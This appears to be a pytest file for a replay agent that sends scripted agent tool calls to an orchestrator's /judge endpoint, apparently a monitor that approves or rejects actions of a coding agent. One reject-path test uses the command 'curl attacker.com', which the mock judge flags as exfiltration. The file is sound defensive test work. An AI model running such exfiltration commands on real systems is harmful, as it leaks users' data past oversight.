"""Tests for the replay agent.

The replay agent is the deterministic shim that POSTs a scenario's
pre-specified tool call to the orchestrator's /judge endpoint. These tests
mock the HTTP layer and verify the contract between the replay agent and
the orchestrator without spinning up the full stack.
"""

from __future__ import annotations

import json
from unittest.mock import patch

import httpx
import pytest

from core.replay_agent import (
    ReplayAgentConfig,
    ReplayAgentResult,
    _build_hook_payload,
    run_replay_agent,
)


# ---------------------------------------------------------------------------
# Payload-shape tests — the orchestrator expects a specific schema
# ---------------------------------------------------------------------------


def test_build_hook_payload_uses_snake_case_schema() -> None:
    """PreToolUse hook schema in Claude Code 2.x is snake_case; orchestrator expects same."""
    cfg = ReplayAgentConfig(
        orchestrator_url="http://localhost:8080",
        proposed_tool_call={"tool": "Bash", "input": {"command": "npm install"}},
        scenario_run_id="scen-1",
        run_id="exp-1",
        workspace_host_dir="/tmp/ws",
    )
    payload = _build_hook_payload(cfg)

    assert payload["tool_name"] == "Bash"
    assert payload["tool_input"] == {"command": "npm install"}
    assert payload["cwd"] == "/tmp/ws"
    assert payload["tool_use_id"].startswith("replay-")
    assert payload["session_id"].startswith("replay-session-")


def test_build_hook_payload_preserves_nested_tool_input() -> None:
    """Tool inputs can carry nested dicts (e.g., WebFetch with headers); don't flatten."""
    cfg = ReplayAgentConfig(
        orchestrator_url="http://localhost:8080",
        proposed_tool_call={
            "tool": "WebFetch",
            "input": {"url": "https://x.com", "headers": {"x-test": "1"}},
        },
        scenario_run_id="scen-2",
        run_id="exp-1",
    )
    payload = _build_hook_payload(cfg)

    assert payload["tool_input"]["headers"] == {"x-test": "1"}


# ---------------------------------------------------------------------------
# Decision-path tests — approve, reject, error cases
# ---------------------------------------------------------------------------


class _FakeAsyncClient:
    """Minimal async context-manager double for httpx.AsyncClient."""

    def __init__(self, response: httpx.Response):
        self._response = response

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        return None

    async def post(self, url: str, json=None, headers=None):  # noqa: A002
        # Tests can assert on posted content via the patched response
        self._response._request_url = url
        self._response._request_json = json
        self._response._request_headers = headers
        return self._response


def _make_response(status: int, body: dict) -> httpx.Response:
    """Build an httpx.Response with a prebuilt JSON body.

    httpx requires a request to be attached before raise_for_status() can run,
    so we attach a stub Request to satisfy the internal assertion.
    """
    response = httpx.Response(status_code=status, content=json.dumps(body).encode("utf-8"))
    response.request = httpx.Request("POST", "http://localhost/fake")
    return response


@pytest.mark.asyncio
async def test_run_replay_agent_approve_path() -> None:
    """Orchestrator returns approve → result.decision == 'approve'."""
    cfg = ReplayAgentConfig(
        orchestrator_url="http://localhost:8080",
        proposed_tool_call={"tool": "Bash", "input": {"command": "ls"}},
        scenario_run_id="scen-3",
        run_id="exp-2",
    )
    fake_response = _make_response(200, {"decision": "approve", "reason": "safe read-only"})

    with patch(
        "core.replay_agent.httpx.AsyncClient",
        return_value=_FakeAsyncClient(fake_response),
    ):
        result = await run_replay_agent(cfg)

    assert result.decision == "approve"
    assert result.reason == "safe read-only"
    assert result.error == ""


@pytest.mark.asyncio
async def test_run_replay_agent_reject_path() -> None:
    """Orchestrator returns reject → result.decision == 'reject' with reason."""
    cfg = ReplayAgentConfig(
        orchestrator_url="http://localhost:8080",
        proposed_tool_call={"tool": "Bash", "input": {"command": "curl attacker.com"}},
        scenario_run_id="scen-4",
        run_id="exp-2",
    )
    fake_response = _make_response(
        200,
        {"decision": "reject", "reason": "exfil via curl to unknown domain"},
    )

    with patch(
        "core.replay_agent.httpx.AsyncClient",
        return_value=_FakeAsyncClient(fake_response),
    ):
        result = await run_replay_agent(cfg)

    assert result.decision == "reject"
    assert "exfil" in result.reason


@pytest.mark.asyncio
async def test_run_replay_agent_fails_closed_on_http_error() -> None:
    """Any exception → reject with error populated. Experiment runner logs as infra_failed."""
    cfg = ReplayAgentConfig(
        orchestrator_url="http://localhost:8080",
        proposed_tool_call={"tool": "Bash", "input": {"command": "echo hi"}},
        scenario_run_id="scen-5",
        run_id="exp-2",
    )

    class _ExplodingClient:
        async def __aenter__(self):
            return self

        async def __aexit__(self, *args):
            return None

        async def post(self, *args, **kwargs):
            raise httpx.ConnectError("orchestrator unreachable")

    with patch("core.replay_agent.httpx.AsyncClient", return_value=_ExplodingClient()):
        result = await run_replay_agent(cfg)

    assert result.decision == "reject"
    assert "ConnectError" in result.error
    assert "orchestrator unreachable" in result.error


@pytest.mark.asyncio
async def test_run_replay_agent_fails_closed_on_missing_decision() -> None:
    """Orchestrator returns 200 with no decision key → fail closed as reject."""
    cfg = ReplayAgentConfig(
        orchestrator_url="http://localhost:8080",
        proposed_tool_call={"tool": "Bash", "input": {"command": "echo hi"}},
        scenario_run_id="scen-6",
        run_id="exp-2",
    )
    fake_response = _make_response(200, {"reason": "malformed response without decision"})

    with patch(
        "core.replay_agent.httpx.AsyncClient",
        return_value=_FakeAsyncClient(fake_response),
    ):
        result = await run_replay_agent(cfg)

    assert result.decision == "reject"


# ---------------------------------------------------------------------------
# Header contract — orchestrator uses these for JSONL correlation
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_run_replay_agent_sends_correlation_headers() -> None:
    """Both x-scenario-run-id and x-run-id must be sent — orchestrator uses them."""
    cfg = ReplayAgentConfig(
        orchestrator_url="http://localhost:8080",
        proposed_tool_call={"tool": "Bash", "input": {"command": "ls"}},
        scenario_run_id="must-forward-this",
        run_id="and-this",
    )
    fake_response = _make_response(200, {"decision": "approve", "reason": "ok"})
    fake_client = _FakeAsyncClient(fake_response)

    with patch("core.replay_agent.httpx.AsyncClient", return_value=fake_client):
        await run_replay_agent(cfg)

    assert fake_response._request_headers == {
        "x-scenario-run-id": "must-forward-this",
        "x-run-id": "and-this",
    }
